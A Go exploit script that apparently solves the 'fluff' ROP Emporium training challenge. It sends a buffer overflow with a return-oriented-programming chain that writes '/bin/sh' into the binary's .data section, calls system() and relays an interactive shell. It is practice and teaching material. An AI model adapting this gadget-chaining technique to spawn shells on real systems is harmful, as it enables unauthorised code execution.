package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"time"
)

// 4 byte padding
var padding = "\x00\x00\x00\x00"

// .data section
// Location: 0x00601050
var dataSection = "\x50\x10\x60\x00" + padding

// pop rdi ret;
// Location: 0x004008c3
var popRDI = "\xc3\x08\x40\x00" + padding

// pop r12; pop r13; pop r14; pop r15; ret;
// Location: 0x004008bc
var popR12 = "\xbc\x08\x40\x00" + padding

// xor r11, r11; pop r14; mov edi, 0x601050; ret;
// Location: 0x00400822
var xorR11R11 = "\x22\x08\x40\x00" + padding

// xor r11, r12; pop r12; mov r13d, 0x604060; ret;
// Location: 0x0040082f
var xorR11R12 = "\x2f\x08\x40\x00" + padding

// xchg r11, r10; pop r15; mov r11d, 0x602050; ret;
// Location: 0x00400840
var xchgR11R10 = "\x40\x08\x40\x00" + padding

// mov qword [r10], r11; pop r13; pop r12; xor byte [r10], r12b; ret;
// Location: 0x0040084e
var movPtrR10R11 = "\x4e\x08\x40\x00" + padding

// system()
// Location: 0x004005e0
var system = "\xe0\x05\x40\x00" + padding

func loadR11(bytesToLoad string) (ropChain string) {
	ropChain = popR12
	ropChain += bytesToLoad
	ropChain += padding + padding
	ropChain += padding + padding
	ropChain += padding + padding
	ropChain += xorR11R11
	ropChain += padding + padding
	ropChain += xorR11R12
	ropChain += padding + padding
	return
}

func loadR10(bytesToLoad string) (ropChain string) {
	ropChain = loadR11(bytesToLoad)
	ropChain += xchgR11R10
	ropChain += padding + padding
	return
}

func writeR11Ptr() (ropChain string) {
	ropChain = movPtrR10R11
	ropChain += padding + padding
	ropChain += padding + padding
	return
}

func main() {
	binary := "./fluff"
	cmd := exec.Command(binary)
	stdin, err := cmd.StdinPipe()
	if err != nil {
		log.Fatal(err)
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Fatal(err)
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		log.Fatal(err)
	}
	if err = cmd.Start(); err != nil {
		log.Fatal(err)
	}

	// Read the initial output
	output := bufio.NewReader(stdout)
	_, err = output.ReadBytes('>')
	if err != nil {
		log.Fatal(err)
	}

	// Copy output to the terminal
	go io.Copy(os.Stdout, stdout)
	go io.Copy(os.Stderr, stderr)

	// Create ROP chain
	var ropChain string
	for i := 0; i < 40; i++ {
		ropChain += "Z"
	}
	// Load "/bin/sh" into .data
	ropChain += loadR10(dataSection)
	ropChain += loadR11("/bin/sh\x00")
	ropChain += writeR11Ptr()

	// Call system()
	ropChain += popRDI
	ropChain += dataSection
	ropChain += system
	ropChain += "\n"
	stdin.Write([]byte(ropChain))

	// Interact with shell
	for {
		input := bufio.NewReader(os.Stdin)
		fmt.Printf("$ ")
		shellCommand, _, _ := input.ReadLine()
		shellCommand = append(shellCommand, '\n')
		stdin.Write([]byte(shellCommand))
		time.Sleep(time.Millisecond * 9)
	}
}
